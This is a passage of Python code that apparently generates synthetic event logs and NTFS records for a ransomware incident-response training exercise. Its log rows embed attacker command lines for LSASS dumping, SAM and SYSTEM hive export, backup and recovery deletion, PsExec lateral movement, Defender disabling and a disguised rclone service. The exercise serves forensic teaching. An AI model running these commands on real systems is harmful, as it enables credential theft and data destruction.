    t_del_enc = parse_ts(T_ENCRYPTOR_DELETE)
    add(t_del_enc, ENCRYPTOR_NAME, "exe", "Windows\\Temp", "FileDelete")
    add(t_del_enc + timedelta(milliseconds=60), ENCRYPTOR_NAME, "exe",
        "Windows\\Temp", "FileDelete|Close")

    t_del = parse_ts(T_STAGING_DELETE)
    offset = 0
    for a in world.archives:
        add(t_del + timedelta(milliseconds=offset), a["name"], "001",
            STAGING_DIR, "FileDelete|Close")
        offset += 140
    for name, ext in [(RCLONE_NAME, "exe"), ("rclone.conf", "conf"),
                      ("7z.exe", "exe"), ("7z.dll", "dll")]:
        add(t_del + timedelta(milliseconds=offset), name, ext, STAGING_DIR,
            "FileDelete|Close")
        offset += 140
    add(t_del + timedelta(milliseconds=offset), "wu", "", "Windows\\Temp",
        "FileDelete|Close")

    # --- background file-server churn -------------------------------------
    brng = random.Random(stable_seed(world.seed, "usn-background"))
    reasons_pool = [
        "DataExtend|DataOverwrite", "DataOverwrite|Close",
        "FileCreate|DataExtend|Close", "BasicInfoChange|Close",
        "DataExtend|DataOverwrite|Close", "FileDelete|Close",
        "SecurityChange|Close",
    ]
    share_dirs = [d for d, _c, _s in ENCRYPTED_DIRS]
    share_dirs.append("Shares\\Finance\\Reports\\Archive")
    for _ in range(BACKGROUND_USN_ROWS):
        day = brng.choice([5, 6, 7, 8, 11, 11, 11, 12])
        if day == 12:
            # Overnight only: nobody is at a desk during the encryption.
            hour = brng.choice([0, 1, 4, 5, 6])
        elif day == 11:
            # 2024-11-11 runs late so the staging window has a real
            # baseline to stand out against rather than empty space.
            hour = brng.randint(7, 22)
        else:
            hour = brng.randint(7, 19)
        t = datetime(2024, 11, day, hour, brng.randint(0, 59),
                     brng.randint(0, 59), brng.randint(0, 999999))
        d = brng.choice(share_dirs)
        stem = brng.choice(OFFICE_STEMS)
        ext = brng.choice(OFFICE_EXTS)
        add(t, f"{stem}_{brng.randint(1000, 9999)}.{ext}", ext, d,
            brng.choice(reasons_pool))

    # --- number and order --------------------------------------------------
    recs.sort(key=lambda r: r[0])
    usn = 4_812_566_784
    rows: List[Dict[str, str]] = []
    nrng = random.Random(stable_seed(world.seed, "usn-numbers"))
    for _t, row in recs:
        row["USN"] = str(usn)
        usn += 8 * nrng.randint(8, 22)
        rows.append(row)
    return rows


def generate_encrypted_files_inventory(rng: random.Random, world: World
                                       ) -> List[Dict[str, str]]:
    """The extension-sweep worksheet: one row per ``.vaulted`` file."""
    rows: List[Dict[str, str]] = []
    note_dirs = {n["dir"] for n in world.notes}
    for f in world.files:
        rows.append({
            "FullPath": f"C:\\{f['dir']}\\{f['enc_name']}",
            "Directory": f"C:\\{f['dir']}",
            "OriginalFileName": f["orig_name"],
            "OriginalExtension": f["orig_ext"],
            "EncryptedFileName": f["enc_name"],
            "EncryptedExtension": ENC_EXT,
            "SizeBytes": str(f["size"]),
            "OriginalCreatedUtc": fmt_ts(f["created"]),
            "EncryptedModifiedUtc": fmt_ts(f["t_end"]),
            "NoteInDirectory": str(f["dir"] in note_dirs),
        })
    return rows


def generate_security_evtx(rng: random.Random, world: World
                           ) -> List[Dict[str, str]]:
    """ACCT-FS01 Security log — **post-clear only**.

    The first record in this file is the 1102 that records its own clearing.
    Nothing from 2024-11-06 through 2024-11-12 02:09:40 survives here. That
    is the point of the exercise: the pre-clear story has to be rebuilt from
    ``dc-security-evtx.csv``, ``jumphost-security-evtx.csv``, the operational
    channels, NTFS, Prefetch, ShimCache, Amcache and SRUM.
    """
    rows: List[Dict[str, str]] = []
    rec = {"n": 1}

    def add(t, eid, user, level, desc, payload):
        rows.append({
            "RecordNumber": str(rec["n"]), "TimeCreated": ts(t),
            "EventID": str(eid), "Channel": "Security",
            "Provider": "Microsoft-Windows-Security-Auditing",
            "Computer": FQDN, "UserName": user, "Level": level,
            "Description": desc, "Payload": payload,
        })
        rec["n"] += 1

    def exec_payload(cmd, parent, user=SVC_ACCOUNT, image=None):
        img = image or cmd.split(" ")[0]
        return (f"SubjectUserName={user} SubjectDomainName={DOMAIN} "
                f"NewProcessName={img} "
                f"CommandLine={cmd} ParentProcessName={parent} "
                f"TokenElevationType=%%1936 MandatoryLabel=High")

    add(T_LOG_CLEAR, 1102, SVC_ACCOUNT, "Information",
        "The audit log was cleared",
        f"SubjectUserName={SVC_ACCOUNT} SubjectDomainName={DOMAIN} "
        f"SubjectLogonId=0x9F41C2 Channel=Security "
        f"Note=FIRST SURVIVING RECORD IN THIS LOG")
    add("2024-11-12 02:09:41.0180000", 4907, "SYSTEM", "Information",
        "Auditing settings on object were changed",
        "ObjectServer=Security ObjectType=File "
        "ObjectName=C:\\Windows\\System32\\winevt\\Logs\\Security.evtx")
    add("2024-11-12 02:10:22", 4688, SVC_ACCOUNT, "Information",
        "A new process has been created",
        exec_payload("C:\\Windows\\System32\\cmd.exe /c",
                     "C:\\Windows\\System32\\svchost.exe"))
    add(T_WBADMIN, 4688, SVC_ACCOUNT, "Information",
        "A new process has been created",
        exec_payload("wbadmin delete catalog -quiet",
                     "C:\\Windows\\System32\\cmd.exe",
                     image="C:\\Windows\\System32\\wbadmin.exe"))
    add(T_BCDEDIT, 4688, SVC_ACCOUNT, "Information",
        "A new process has been created",
        exec_payload("bcdedit /set {default} recoveryenabled No",
                     "C:\\Windows\\System32\\cmd.exe",
                     image="C:\\Windows\\System32\\bcdedit.exe"))
    add("2024-11-12 02:11:47", 4688, SVC_ACCOUNT, "Information",
        "A new process has been created",
        exec_payload("bcdedit /set {default} bootstatuspolicy ignoreallfailures",
                     "C:\\Windows\\System32\\cmd.exe",
                     image="C:\\Windows\\System32\\bcdedit.exe"))
    add("2024-11-12 02:12:33", 4688, SVC_ACCOUNT, "Information",
        "A new process has been created",
        exec_payload("net stop MSSQLSERVER /y",
                     "C:\\Windows\\System32\\cmd.exe",
                     image="C:\\Windows\\System32\\net.exe"))
    add("2024-11-12 02:13:11", 4688, SVC_ACCOUNT, "Information",
        "A new process has been created",
        exec_payload("taskkill /F /IM sqlservr.exe",
                     "C:\\Windows\\System32\\cmd.exe",
                     image="C:\\Windows\\System32\\taskkill.exe"))
    add(T_ENCRYPTOR_EXEC, 4688, SVC_ACCOUNT, "Information",
        "A new process has been created",
        exec_payload(
            f"C:\\Windows\\Temp\\{ENCRYPTOR_NAME} -enc -threads 16 "
            f"-note {NOTE_NAME} -ext .{ENC_EXT} -id {VICTIM_ID}",
            "C:\\Windows\\System32\\cmd.exe",
            image=f"C:\\Windows\\Temp\\{ENCRYPTOR_NAME}"))
    add("2024-11-12 02:13:52.2140000", 4672, SVC_ACCOUNT, "Information",
        "Special privileges assigned to new logon",
        f"SubjectUserName={SVC_ACCOUNT} SubjectDomainName={DOMAIN} "
        "PrivilegeList=SeBackupPrivilege SeRestorePrivilege "
        "SeTakeOwnershipPrivilege SeDebugPrivilege")
    add("2024-11-12 02:41:18", 4624, SVC_ACCOUNT, "Information",
        "An account was successfully logged on",
        f"TargetUserName={SVC_ACCOUNT} TargetDomainName={DOMAIN} "
        f"LogonType=10 LogonProcessName=User32 "
        f"AuthenticationPackageName=Negotiate WorkstationName={JUMP_HOST} "
        f"IpAddress={JUMP_IP} IpPort=51882")
    add("2024-11-12 02:44:02", 5140, SVC_ACCOUNT, "Information",
        "A network share object was accessed",
        f"SubjectUserName={SVC_ACCOUNT} ShareName=\\\\*\\Accounting$ "
        f"ShareLocalPath=\\??\\C:\\Shares\\Accounting IpAddress={JUMP_IP} "
        "AccessMask=0x1")
    add("2024-11-12 03:39:10", 4688, SVC_ACCOUNT, "Information",
        "A new process has been created",
        exec_payload(f"cmd.exe /c del /f /q C:\\Windows\\Temp\\{ENCRYPTOR_NAME}",
                     "C:\\Windows\\System32\\cmd.exe",
                     image="C:\\Windows\\System32\\cmd.exe"))
    add("2024-11-12 03:41:20", 4688, SVC_ACCOUNT, "Information",
        "A new process has been created",
        exec_payload(f"cmd.exe /c rd /s /q {STAGING_DIR_FULL}",
                     "C:\\Windows\\System32\\cmd.exe",
                     image="C:\\Windows\\System32\\cmd.exe"))
    add(T_ACTOR_LOGOFF, 4634, SVC_ACCOUNT, "Information",
        "An account was logged off",
        f"TargetUserName={SVC_ACCOUNT} TargetDomainName={DOMAIN} "
        "LogonType=10 LogonId=0x9F41C2")

    # Benign post-clear background so the file is not 100% attacker activity.
    brng = random.Random(stable_seed(world.seed, "sec-noise"))
    for hh, mm, eid, user, desc, payload in [
        (2, 15, 4624, "SYSTEM", "An account was successfully logged on",
         "TargetUserName=SYSTEM LogonType=5 "
         "ProcessName=C:\\Windows\\System32\\services.exe"),
        (2, 30, 4624, "SYSTEM", "An account was successfully logged on",
         "TargetUserName=SYSTEM LogonType=5 "
         "ProcessName=C:\\Windows\\System32\\services.exe"),
        (3, 0, 4634, "SYSTEM", "An account was logged off",
         "TargetUserName=SYSTEM LogonType=5"),
        (4, 0, 4624, "SYSTEM", "An account was successfully logged on",
         "TargetUserName=ACCT-FS01$ LogonType=5 "
         "ProcessName=C:\\Windows\\System32\\services.exe"),
        (6, 41, 4624, "svc-monitor", "An account was successfully logged on",
         f"TargetUserName=svc-monitor TargetDomainName={DOMAIN} LogonType=3 "
         "IpAddress=10.0.6.90 IpPort=49788"),
        (7, 12, 4625, "jrayner", "An account failed to log on",
         f"TargetUserName=jrayner TargetDomainName={DOMAIN} LogonType=3 "
         "Status=0xC000006D IpAddress=10.0.4.61 "
         "Note=user hitting an unreachable share after encryption"),
        (7, 14, 4625, "kdelacroix", "An account failed to log on",
         f"TargetUserName=kdelacroix TargetDomainName={DOMAIN} LogonType=3 "
         "Status=0xC000006D IpAddress=10.0.4.77"),
        (8, 5, 4624, "ir-responder", "An account was successfully logged on",
         f"TargetUserName=ir-responder TargetDomainName={DOMAIN} LogonType=10 "
         "IpAddress=10.0.9.14 IpPort=52014 "
         "Note=incident response session begins"),
        (8, 6, 4672, "ir-responder",
         "Special privileges assigned to new logon",
         "SubjectUserName=ir-responder PrivilegeList=SeBackupPrivilege "
         "SeSecurityPrivilege SeDebugPrivilege"),
    ]:
        add("2024-11-12 %02d:%02d:%02d" % (hh, mm, brng.randint(1, 58)),
            eid, user, "Information", desc, payload)

    rows.sort(key=lambda r: r["TimeCreated"])
    for i, r in enumerate(rows):
        r["RecordNumber"] = str(9_412_806 + i)
    return rows


def generate_dc_security_evtx(rng: random.Random, world: World
                              ) -> List[Dict[str, str]]:
    """FINANCE-DC01 Security log — the surviving authentication record.

    The actor cleared ACCT-FS01's log and never touched the DC's, which is
    the normal pattern. This log carries the 212-attempt NTLM validation
    burst against ``svc-backup``, the success that ends it, the account's
    genuine nightly baseline, and the mid-timeline pivot to ``a-mbrennan``.
    """
    rows: List[Dict[str, str]] = []

    def add(t, eid, user, desc, payload, level="Information"):
        rows.append({
            "RecordNumber": "0", "TimeCreated": ts(t), "EventID": str(eid),
            "Channel": "Security",
            "Provider": "Microsoft-Windows-Security-Auditing",
            "Computer": DC_FQDN, "UserName": user, "Level": level,
            "Description": desc, "Payload": payload,
        })

    # --- svc-backup's genuine baseline: nightly backup-server logons -------
    for day in range(1, 13):
        for i, (h, host, ip) in enumerate(
                zip([1, 1, 2], BACKUP_HOSTS, BACKUP_IPS)):
            add("2024-11-%02d %02d:%02d:%02d" % (day, h, 5 + i * 9, 11 + i),
                4769, SVC_ACCOUNT, "A Kerberos service ticket was requested",
                f"TargetUserName={SVC_ACCOUNT}@finance.local "
                f"ServiceName={host}$ TicketEncryptionType=0x12 "
                f"IpAddress=::ffff:{ip} Status=0x0")

    # --- the brute force ---------------------------------------------------
    t0 = parse_ts(T_BRUTE_START)
    t1 = parse_ts(T_BRUTE_END)
    step = (t1 - t0).total_seconds() / (BRUTE_FAILURES - 1)
    for i in range(BRUTE_FAILURES):
        t = t0 + timedelta(seconds=step * i)
        add(fmt_ts(t), 4776, SVC_ACCOUNT,
            "The computer attempted to validate the credentials for an account",
            f"PackageName=MICROSOFT_AUTHENTICATION_PACKAGE_V1_0 "
            f"LogonAccount={SVC_ACCOUNT} Source Workstation={JUMP_HOST} "
            f"ErrorCode=0xC000006A", level="Information")
    add(T_BRUTE_SUCCESS, 4776, SVC_ACCOUNT,
        "The computer attempted to validate the credentials for an account",
        f"PackageName=MICROSOFT_AUTHENTICATION_PACKAGE_V1_0 "
        f"LogonAccount={SVC_ACCOUNT} Source Workstation={JUMP_HOST} "
        f"ErrorCode=0x0 Note=brute force succeeds here")
    add("2024-11-06 21:47:23", 4768, SVC_ACCOUNT,
        "A Kerberos authentication ticket (TGT) was requested",
        f"TargetUserName={SVC_ACCOUNT} TargetDomainName=FINANCE.LOCAL "
        f"TicketEncryptionType=0x12 IpAddress=::ffff:{JUMP_IP} Status=0x0")

    # --- discovery / credential access / lateral movement ------------------
    dc_walk = [
        ("2024-11-07 02:11:44", 4769, SVC_ACCOUNT,
         f"ServiceName=LDAP/{DC_HOST} IpAddress=::ffff:{JUMP_IP} Status=0x0"),
        ("2024-11-07 02:12:09", 4769, SVC_ACCOUNT,
         f"ServiceName={DC_HOST}$ IpAddress=::ffff:{JUMP_IP} Status=0x0"),
        ("2024-11-07 02:18:31", 4624, SVC_ACCOUNT,
         f"TargetUserName={SVC_ACCOUNT} LogonType=3 IpAddress={JUMP_IP} "
         "Note=share enumeration against the DC"),
        ("2024-11-08 02:04:18", 4768, ADMIN_ACCOUNT,
         f"TargetUserName={ADMIN_ACCOUNT} TargetDomainName=FINANCE.LOCAL "
         f"IpAddress=::ffff:{JUMP_IP} Status=0x0 "
         "Note=FIRST appearance of the domain admin account from JUMP-01"),
        ("2024-11-08 02:04:41", 4672, ADMIN_ACCOUNT,
         f"SubjectUserName={ADMIN_ACCOUNT} PrivilegeList=SeDebugPrivilege "
         "SeTcbPrivilege SeBackupPrivilege"),
        ("2024-11-08 02:31:52", 4769, ADMIN_ACCOUNT,
         f"ServiceName=cifs/{DC_FQDN} TicketEncryptionType=0x17 "
         f"IpAddress=::ffff:{JUMP_IP} Status=0x0 "
         "Note=RC4 service ticket — Kerberoast-consistent"),
        ("2024-11-09 01:19:12", 4769, SVC_ACCOUNT,
         f"ServiceName=cifs/{FQDN} IpAddress=::ffff:{JUMP_IP} Status=0x0"),
        ("2024-11-09 01:19:44", 4624, SVC_ACCOUNT,
         f"TargetUserName={SVC_ACCOUNT} LogonType=3 IpAddress={JUMP_IP} "
         "Note=service-install logon preceding PSEXESVC on ACCT-FS01"),
        ("2024-11-09 02:41:09", 4769, ADMIN_ACCOUNT,
         f"ServiceName=cifs/{BACKUP_HOSTS[0]} IpAddress=::ffff:{JUMP_IP} "
         "Status=0x0 Note=actor reaches the backup infrastructure"),
        ("2024-11-10 23:41:08", 4769, SVC_ACCOUNT,
         f"ServiceName=cifs/{FQDN} IpAddress=::ffff:{JUMP_IP} Status=0x0"),
        ("2024-11-11 20:57:22", 4769, SVC_ACCOUNT,
         f"ServiceName=cifs/{FQDN} IpAddress=::ffff:{JUMP_IP} Status=0x0 "
         "Note=session in which rclone is delivered"),
        ("2024-11-12 02:01:44", 4769, SVC_ACCOUNT,
         f"ServiceName=cifs/{FQDN} IpAddress=::ffff:{JUMP_IP} Status=0x0"),
        ("2024-11-12 02:41:18", 4769, SVC_ACCOUNT,
         f"ServiceName=TERMSRV/{FQDN} IpAddress=::ffff:{JUMP_IP} Status=0x0 "
         "Note=post-encryption RDP reconnect to ACCT-FS01"),
    ]
    for t, eid, user, payload in dc_walk:
        desc = {
            4624: "An account was successfully logged on",
            4672: "Special privileges assigned to new logon",
            4768: "A Kerberos authentication ticket (TGT) was requested",
            4769: "A Kerberos service ticket was requested",
        }[eid]
        add(t, eid, user, desc, payload)

    rows.sort(key=lambda r: r["TimeCreated"])
    for i, r in enumerate(rows):
        r["RecordNumber"] = str(28_114_902 + i)
    return rows


def generate_jumphost_security_evtx(rng: random.Random, world: World
                                    ) -> List[Dict[str, str]]:
    """JUMP-01 Security log — the entry point.

    JUMP-01 is the internet-exposed RDP host. Its Security log was never
    cleared, so the 4625 burst that anchors the dwell window is still here.
    """
    rows: List[Dict[str, str]] = []

    def add(t, eid, user, desc, payload):
        rows.append({
            "RecordNumber": "0", "TimeCreated": ts(t), "EventID": str(eid),
            "Channel": "Security",
            "Provider": "Microsoft-Windows-Security-Auditing",
            "Computer": JUMP_FQDN, "UserName": user, "Level": "Information",
            "Description": desc, "Payload": payload,
        })

    t0 = parse_ts(T_BRUTE_START)
    t1 = parse_ts(T_BRUTE_END)
    step = (t1 - t0).total_seconds() / (BRUTE_FAILURES - 1)
    for i in range(BRUTE_FAILURES):
        t = t0 + timedelta(seconds=step * i)
        add(fmt_ts(t), 4625, SVC_ACCOUNT, "An account failed to log on",
            f"TargetUserName={SVC_ACCOUNT} TargetDomainName={DOMAIN} "
            f"LogonType=10 Status=0xC000006D SubStatus=0xC000006A "
            f"LogonProcessName=User32 WorkstationName=- "
            f"IpAddress={BRUTE_IP} IpPort={49000 + (i * 7) % 900}")
    add(T_BRUTE_SUCCESS, 4624, SVC_ACCOUNT,
        "An account was successfully logged on",
        f"TargetUserName={SVC_ACCOUNT} TargetDomainName={DOMAIN} "
        f"LogonType=10 LogonProcessName=User32 "
        f"AuthenticationPackageName=Negotiate WorkstationName=- "
        f"IpAddress={BRUTE_IP} IpPort=49771 "
        "Note=SUCCESS — this single event ends the burst")
    add("2024-11-06 21:47:24", 4672, SVC_ACCOUNT,
        "Special privileges assigned to new logon",
        f"SubjectUserName={SVC_ACCOUNT} PrivilegeList=SeBackupPrivilege "
        "SeRestorePrivilege SeSecurityPrivilege")

    def proc(t, cmd, image, parent, user=SVC_ACCOUNT):
        add(t, 4688, user, "A new process has been created",
            f"SubjectUserName={user} SubjectDomainName={DOMAIN} "
            f"NewProcessName={image} CommandLine={cmd} "
            f"ParentProcessName={parent}")

    cmd_exe = "C:\\Windows\\System32\\cmd.exe"
    sys32 = "C:\\Windows\\System32"
    proc("2024-11-06 21:49:02", "whoami /groups", f"{sys32}\\whoami.exe",
         cmd_exe)
    proc("2024-11-06 21:49:41", "net user svc-backup /domain",
         f"{sys32}\\net.exe", cmd_exe)
    proc(T_DISCOVERY, "systeminfo", f"{sys32}\\systeminfo.exe", cmd_exe)
    proc("2024-11-07 02:12:09", "net view /domain", f"{sys32}\\net.exe",
         cmd_exe)
    proc("2024-11-07 02:13:44", "nltest /dclist:finance.local",
         f"{sys32}\\nltest.exe", cmd_exe)
    proc("2024-11-07 02:15:02", 'net group "Domain Admins" /domain',
         f"{sys32}\\net.exe", cmd_exe)
    proc("2024-11-07 02:41:18",
         "C:\\Users\\svc-backup\\Downloads\\netscan.exe /hide /auto:scan.xml",
         "C:\\Users\\svc-backup\\Downloads\\netscan.exe", cmd_exe)
    proc(T_CREDACCESS,
         "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 704 "
         "C:\\Windows\\Temp\\l.dmp full",
         f"{sys32}\\rundll32.exe", cmd_exe)
    proc("2024-11-08 01:54:41", "reg save HKLM\\SAM C:\\Windows\\Temp\\s.hiv",
         f"{sys32}\\reg.exe", cmd_exe)
    proc("2024-11-08 01:54:58",
         "reg save HKLM\\SYSTEM C:\\Windows\\Temp\\y.hiv",
         f"{sys32}\\reg.exe", cmd_exe)
    add("2024-11-09 01:18:52", 4648, SVC_ACCOUNT,
        "A logon was attempted using explicit credentials",
        f"SubjectUserName={SVC_ACCOUNT} TargetUserName={SVC_ACCOUNT} "
        f"TargetDomainName={DOMAIN} TargetServerName={HOSTNAME} "
        f"ProcessName=C:\\Users\\svc-backup\\Downloads\\PsExec64.exe "
        f"IpAddress={HOST_IP} "
        "Note=explicit-credential use naming the destination host")
    proc("2024-11-09 01:18:50",
         f"PsExec64.exe \\\\{HOSTNAME} -s -accepteula cmd.exe",
         "C:\\Users\\svc-backup\\Downloads\\PsExec64.exe", cmd_exe)
    add("2024-11-11 20:52:05", 4648, SVC_ACCOUNT,
        "A logon was attempted using explicit credentials",
        f"SubjectUserName={SVC_ACCOUNT} TargetUserName={SVC_ACCOUNT} "
        f"TargetDomainName={DOMAIN} TargetServerName={HOSTNAME} "
        f"ProcessName={sys32}\\mstsc.exe IpAddress={HOST_IP}")
    add("2024-11-12 02:01:38", 4648, SVC_ACCOUNT,
        "A logon was attempted using explicit credentials",
        f"SubjectUserName={SVC_ACCOUNT} TargetUserName={SVC_ACCOUNT} "
        f"TargetDomainName={DOMAIN} TargetServerName={HOSTNAME} "
        f"ProcessName={sys32}\\mstsc.exe IpAddress={HOST_IP} "
        "Note=the session in which the evasion chain and encryption run")

    # A little genuine admin traffic so the burst is not the only content.
    nrng = random.Random(stable_seed(world.seed, "jump-noise"))
    for day in (4, 5, 6, 7, 11):
        for u in nrng.sample(NORMAL_USERS, 2):
            add("2024-11-%02d %02d:%02d:%02d" % (
                day, nrng.randint(7, 17), nrng.randint(0, 59),
                nrng.randint(0, 59)),
                4624, u, "An account was successfully logged on",
                f"TargetUserName={u} TargetDomainName={DOMAIN} LogonType=10 "
                f"IpAddress=10.0.4.{nrng.randint(20, 120)} "
                "Note=routine administrative use of the jump host")

    rows.sort(key=lambda r: r["TimeCreated"])
    for i, r in enumerate(rows):
        r["RecordNumber"] = str(1_204_881 + i)
    return rows


def generate_system_evtx(rng: random.Random, world: World
                         ) -> List[Dict[str, str]]:
    """ACCT-FS01 System log — service installs and the shadow-copy deletion.

    The System channel was not cleared. ``volsnap`` EID 25 is the surviving
    proof of ``vssadmin delete shadows /all /quiet`` at 02:06:33, whose 4688
    was destroyed by the 02:09:41 log clear.
    """
    rows: List[Dict[str, str]] = []

    def add(t, eid, provider, desc, payload, level="Information"):
        rows.append({
            "RecordNumber": "0", "TimeCreated": ts(t), "EventID": str(eid),
            "Channel": "System", "Provider": provider, "Computer": FQDN,
            "Level": level, "Description": desc, "Payload": payload,
        })

    scm = "Service Control Manager"
    add(T_LATERAL, 7045, scm, "A service was installed in the system",
        "ServiceName=PSEXESVC "
        "ImagePath=%SystemRoot%\\PSEXESVC.exe ServiceType=user mode service "
        "StartType=demand start AccountName=LocalSystem "
        "Note=PsExec-style remote execution")
    add("2024-11-09 01:22:18", 7036, scm, "Service state changed",
        "ServiceName=PSEXESVC State=Stopped")
    add(T_PERSIST, 7045, scm, "A service was installed in the system",
        "ServiceName=VaultUpd DisplayName=Windows Update Assistant "
        f"ImagePath={STAGING_DIR_FULL}\\rclone.exe --config "
        f"{STAGING_DIR_FULL}\\rclone.conf serve "
        "ServiceType=user mode service StartType=auto start "
        "AccountName=LocalSystem "
        "Note=persistence — display name mimics a Windows component")
    add("2024-11-10 23:41:12", 7040, scm, "Service start type changed",
        "ServiceName=VaultUpd OldStartType=demand start "
        "NewStartType=auto start")
    add("2024-11-11 21:03:02", 7036, scm, "Service state changed",
        "ServiceName=VaultUpd State=Running")

    for i, t in enumerate(["2024-11-12 02:06:34", "2024-11-12 02:06:36",
                           "2024-11-12 02:06:38", "2024-11-12 02:06:41"]):
        add(t, 25, "volsnap",
            "The shadow copies of volume C: were deleted because the shadow "
            "copy storage could not grow in time",
            f"Volume=C: ShadowCopyId={{8a41c0{i}2-77e1-4b9c-9d2e-"
            f"11f4a7c30{i}b1}} "
            "Note=one record per deleted snapshot; the 4688 for vssadmin.exe "
            "did not survive the 02:09:41 log clear", level="Error")
    add("2024-11-12 02:06:44", 8224, "VSS",
        "The VSS service is shutting down due to idle timeout",
        "Operation=Shutdown")
    add("2024-11-12 02:12:41", 7036, scm, "Service state changed",
        "ServiceName=SQL Server (MSSQLSERVER) State=Stopped")
    add("2024-11-12 02:12:44", 7036, scm, "Service state changed",
        "ServiceName=SQL Server Agent (MSSQLSERVER) State=Stopped")
    add("2024-11-12 03:41:18", 7036, scm, "Service state changed",
        "ServiceName=VaultUpd State=Stopped")

    # Routine service churn so the file reads like a real System log.
    nrng = random.Random(stable_seed(world.seed, "system-noise"))
    routine = ["Windows Update", "Windows Defender Antivirus Service",
               "Background Intelligent Transfer Service",
               "Distributed File System Replication",
               "Microsoft Software Shadow Copy Provider",
               "Server", "Workstation", "Windows Event Log"]
    for day in (6, 7, 8, 9, 10, 11, 12):
        for _ in range(4):
            svc = nrng.choice(routine)
            add("2024-11-%02d %02d:%02d:%02d" % (
                day, nrng.randint(0, 23), nrng.randint(0, 59),
                nrng.randint(0, 59)),
                7036, scm, "Service state changed",
                f"ServiceName={svc} "
                f"State={nrng.choice(['Running', 'Stopped'])}")

    rows.sort(key=lambda r: r["TimeCreated"])
    for i, r in enumerate(rows):
        r["RecordNumber"] = str(704_118 + i)
    return rows


def generate_defender_evtx(rng: random.Random, world: World
                           ) -> List[Dict[str, str]]:
    """Microsoft-Windows-Windows Defender/Operational.

    Two things matter here. The 1116/1117 detections on 2024-11-09, during the
    actor's first session on this host, name the actor's tooling before it was excluded — Chapter 12 §12.2.7 calls
    this "a gift". The 5007/5001 pair shows the exclusion (21:52 on 11-11,
    to let rclone run) and then the full real-time-protection disable at
    02:02:18 on 11-12, twelve minutes before encryption.
    """
    rows: List[Dict[str, str]] = []
    ch = "Microsoft-Windows-Windows Defender/Operational"

    def add(t, eid, user, desc, payload, level="Information"):
        rows.append({
            "RecordNumber": "0", "TimeCreated": ts(t), "EventID": str(eid),
            "Channel": ch, "Provider": "Microsoft-Windows-Windows Defender",
            "Computer": FQDN, "UserName": user, "Level": level,
            "Description": desc, "Payload": payload,
        })

    add("2024-11-09 02:14:07", 1116, "SYSTEM",
        "The antimalware platform detected malware or other potentially "
        "unwanted software",
        "ThreatName=HackTool:Win64/Mimikatz.E Severity=Severe "
        "Category=Tool Path=file:_C:\\Windows\\Temp\\l.dmp "
        f"ProcessName=C:\\Windows\\System32\\rundll32.exe User={DOMAIN}\\"
        f"{SVC_ACCOUNT} ActionSuccess=true", level="Warning")
    add("2024-11-09 02:14:09", 1117, "SYSTEM",
        "The antimalware platform performed an action to protect your system",
        "ThreatName=HackTool:Win64/Mimikatz.E Action=Quarantine "
        "Note=names the actor's tooling three days before encryption")
    add("2024-11-09 02:44:31", 1116, "SYSTEM",
        "The antimalware platform detected malware or other potentially "
        "unwanted software",
        "ThreatName=HackTool:Win32/NetworkScanner Severity=Moderate "
        "Category=Tool Path=file:_C:\\Windows\\Temp\\netscan.exe "
        f"User={DOMAIN}\\{SVC_ACCOUNT} ActionSuccess=true", level="Warning")
    add("2024-11-09 02:44:33", 1117, "SYSTEM",
        "The antimalware platform performed an action to protect your system",
        "ThreatName=HackTool:Win32/NetworkScanner Action=Quarantine")
    add(T_DEFENDER_EXCLUSION, 5007, SVC_ACCOUNT,
        "The antimalware platform configuration changed",
        "OldValue=Default\\Exclusions\\Paths = (empty) "
        f"NewValue=Default\\Exclusions\\Paths\\{STAGING_DIR_FULL} = 0x0 "
        "Note=added 38 minutes into staging and 48 minutes before the rclone "
        "transfer begins", level="Warning")
    add("2024-11-11 21:53:04", 5007, SVC_ACCOUNT,
        "The antimalware platform configuration changed",
        "OldValue=Default\\Exclusions\\Processes = (empty) "
        "NewValue=Default\\Exclusions\\Processes\\rclone.exe = 0x0",
        level="Warning")
    add(T_DEFENDER_OFF, 5001, SVC_ACCOUNT,
        "Real-time protection is disabled",
        "Feature=Real-Time Protection Reason=Administrator action "
        "RTPState=Disabled "
        f"User={DOMAIN}\\{SVC_ACCOUNT} "
        "Note=11 minutes 48 seconds before the first encrypted file",
        level="Error")
    add("2024-11-12 02:02:21", 5007, SVC_ACCOUNT,
        "The antimalware platform configuration changed",
        "OldValue=HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender"
        "\\Real-Time Protection\\DisableRealtimeMonitoring = 0x0 "
        "NewValue=HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender"
        "\\Real-Time Protection\\DisableRealtimeMonitoring = 0x1",
        level="Warning")
    add("2024-11-12 02:02:24", 5007, SVC_ACCOUNT,
        "The antimalware platform configuration changed",
        "OldValue=DisableAntiSpyware = 0x0 NewValue=DisableAntiSpyware = 0x1",
        level="Warning")
    add("2024-11-12 02:02:52", 5010, SVC_ACCOUNT,
        "Scanning for malware and unwanted software is disabled",
        "Feature=Antimalware scanning RTPState=Disabled", level="Error")

    # Routine signature updates, so the channel is not 100% incident.
    nrng = random.Random(stable_seed(world.seed, "defender-noise"))
    for day in (5, 6, 7, 8, 9, 10, 11):
        add("2024-11-%02d %02d:%02d:%02d" % (
            day, nrng.randint(3, 5), nrng.randint(0, 59),
            nrng.randint(0, 59)),
            2000, "SYSTEM", "The antimalware definitions updated successfully",
            "CurrentSignatureVersion=1.421.%d.0 "
            "UpdateSource=Microsoft Update Server" % nrng.randint(100, 900))

    rows.sort(key=lambda r: r["TimeCreated"])
    for i, r in enumerate(rows):
        r["RecordNumber"] = str(30_441 + i)
    return rows


def generate_terminalservices_evtx(rng: random.Random, world: World
                                   ) -> List[Dict[str, str]]:
    """TerminalServices operational channels on ACCT-FS01.

    RemoteConnectionManager 1149 records the source address of an RDP
    connection *before* authentication, and LocalSessionManager 21/22/24/25
    records session lifecycle. Neither channel was cleared, so these are the
    surviving record of the actor's interactive sessions on this host.
    """
    rows: List[Dict[str, str]] = []
    rcm = "Microsoft-Windows-TerminalServices-RemoteConnectionManager" \
          "/Operational"
    lsm = "Microsoft-Windows-TerminalServices-LocalSessionManager" \
          "/Operational"

    def add(t, eid, channel, user, desc, payload):
        rows.append({
            "RecordNumber": "0", "TimeCreated": ts(t), "EventID": str(eid),
            "Channel": channel,
            "Provider": channel.split("/")[0],
            "Computer": FQDN, "UserName": user, "Level": "Information",
            "Description": desc, "Payload": payload,
        })

    sessions = [
        ("2024-11-09 01:26:41", "2024-11-09 03:11:20", 3, SVC_ACCOUNT,
         "first interactive session on ACCT-FS01"),
